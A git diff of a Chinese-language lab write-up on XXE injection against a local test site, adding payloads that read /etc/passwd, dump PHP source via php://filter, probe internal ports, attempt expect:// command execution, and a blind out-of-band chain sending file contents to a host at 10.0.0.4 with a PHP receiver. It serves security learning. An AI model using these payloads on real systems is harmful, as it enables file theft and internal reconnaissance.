@@ -72,7 +72,7 @@ XML实体又分为**内部实体**和**外部实体**，声明方式如下：
 
 
 
-# 演示
+# 有回显演示
 
 ![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210824232057.png)
 
@@ -90,6 +90,8 @@ http://www.webtester.com/xxe.php?xml=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21
 
 在php中还可以利用伪协议读取任意文件
 
+### file://
+
 ```
 <?xml version="1.0"?><!DOCTYPE  a  [<!ENTITY b SYSTEM "file:///etc/passwd">]><c>&b;</c>
 ```
@@ -98,4 +100,100 @@ http://www.webtester.com/xxe.php?xml=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21
 http://www.webtester.com/xxe.php?xml=%3c%3fxml%20version%3d%221.0%22%3f%3e%3c!doctype%20%20a%20%20%5b%3c!entity%20b%20system%20%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%5d%3e%3cc%3e%26b%3b%3c%2fc%3e
 ```
 
-我也不知道为什么没有成功。。。
+我也不知道为什么没有成功。。。查看源码：
+
+```
+<?php
+include 'init.php';
+
+$string_xml = '<?xml version="1.0" encoding="utf-8"?><note><to>George</to><from>John</from><heading>Reminder</heading><body>xml实体注入</body></note>';
+
+$xml = isset($_GET['xml'])?$_GET['xml']:$string_xml;
+$data = simplexml_load_string($xml);
+echo  '<meta charset="UTF-8">';
+print_r($data);
+?>
+```
+
+水平有限，看不出所以然来，看来要学一学**世界上最好的语言了**（手动狗头）。
+
+### php://
+
+```
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE xdsec [<!ELEMENT methodname ANY >
+<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=xxe.php" >]>
+<methodcall>
+<methodname>&xxe;</methodname>
+</methodcall>
+```
+
+一如既往的没有成功。。。
+
+### http://
+
+扫描端口
+
+```
+<?xml version="1.0"?>
+<!DOCTYPE ANY [
+<!ENTITY test SYSTEM "http://10.0.0.4:80">
+]>
+<abc>&test;</abc>
+```
+
+要裂开了，等回头请教大佬看看是怎么回事。
+
+还有个很奇怪的点是，已经在虚拟机中修改了虚拟网络，部分虚拟机是按照`10.0.0.x`配置IP地址的，但是也有部分是按照路由器的设置来分配IP地址的，即使在虚拟机中设置网卡为`DHCP`也是无济于事，十分郁闷。
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210825083438.png)
+
+下面这是另外一个虚拟机，可以看到IP地址是和我们预想的保持一致的。
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210825083713.png)
+
+### expect://
+
+执行命令
+
+```
+<?xml version="1.0"?> <!doctype any [ <!entity test system "expect://whoami">
+```
+
+别想了，也不会有什么结果的。
+
+
+
+# 无回显演示
+
+无回显XXE又称为blind xxe，可以使用外带数据通道提取数据。
+
+访问目标页面查看，发现什么都没有，就是这个样子。
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210825084338.png)
+
+构造payload，发送到后端
+
+```
+?xml=<?xml version="1.0"?>
+<!DOCTYPE ANY[
+<!ENTITY % file SYSTEM "file:///var/www/html/1.txt">
+<!ENTITY % remote SYSTEM "http://10.0.0.4/evil.xml">
+%remote;
+%all;
+]>
+<root>&send;</root>
+```
+
+或者这样
+
+```
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://10.0.0.4/1.txt?file=%file;'>">
+```
+
+读取内容
+
+```
+<?php file_put_contents("1.txt", $_GET['file']); ?>
+```
+
